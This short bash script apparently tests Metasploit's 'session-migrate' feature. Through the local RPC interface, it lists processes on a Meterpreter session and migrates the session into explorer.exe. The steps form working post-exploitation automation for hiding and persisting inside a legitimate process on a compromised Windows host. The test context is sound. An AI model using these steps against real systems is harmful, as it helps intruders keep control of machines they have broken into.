#!/bin/bash 

REQFILE="ebsessiongood.var"

if [ ! -f $REQFILE ]
then
	echo "Requisite file not found, SKIP"
	exit 1
fi

FEAT="session-migrate"

msfrpc -a 127.0.0.1 -P letmein <<EOF
irb_context.echo = false
rpc.call('session.meterpreter_write', 1, 'ps')
data = rpc.call('session.meterpreter_read', 1)['data']
while data.empty? do sleep 2; data = rpc.call('session.meterpreter_read', 1)['data'] end
tokens = data.split("\n")
exp = tokens.select { |t| t.include? 'explorer.exe' }
pid = exp[0].split[0]
rpc.call('session.meterpreter_write', 1, "migrate #{pid}")
data = rpc.call('session.meterpreter_read', 1)['data']
while data.empty? do sleep 2; data = rpc.call('session.meterpreter_read', 1)['data'] end
puts data
exit
EOF

